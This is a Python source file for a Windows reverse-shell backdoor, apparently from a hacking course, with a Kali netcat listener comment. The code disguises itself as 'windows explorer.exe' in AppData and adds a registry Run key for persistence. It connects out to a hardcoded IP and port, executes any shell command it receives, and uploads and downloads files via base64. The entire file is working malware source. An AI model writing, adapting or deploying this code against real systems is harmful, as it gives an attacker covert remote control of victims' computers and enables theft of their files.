# nc --vv -l -p 4444 on kali

import socket, subprocess, json, os, base64, sys, shutil


class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        evil_file_location = os.environ['appdata'] + "\\windows explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def exec_sys_comm(self, command):
        #DEVNULL = open(os.devnull, "wb") for py2
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def change_working_dir(self, path):
        os.chdir(path)
        return "[+] Changing working directory to "+ path

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successfull"

    def run(self):
        while True:
            command = self.reliable_recv()
            try:
                if command[0]=="exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.change_working_dir(command[1])
                elif command[0] == "download":
                    command_output = self.read_file(command[1])
                elif command[0] == "upload":
                    command_output = self.write_file(command[1], command[2])
                else:
                    #command = self.connection.recv(1024)
                    command_output = self.exec_sys_comm(command)
            except Exception:
                command_output = "[-]Error in command execution"
            self.reliable_send(command_output)
            #self.connection.send(command_output)

try:
    my_back = Backdoor("10.0.2.16", 4444)
    my_back.run()
except Exception:
    sys.exit()
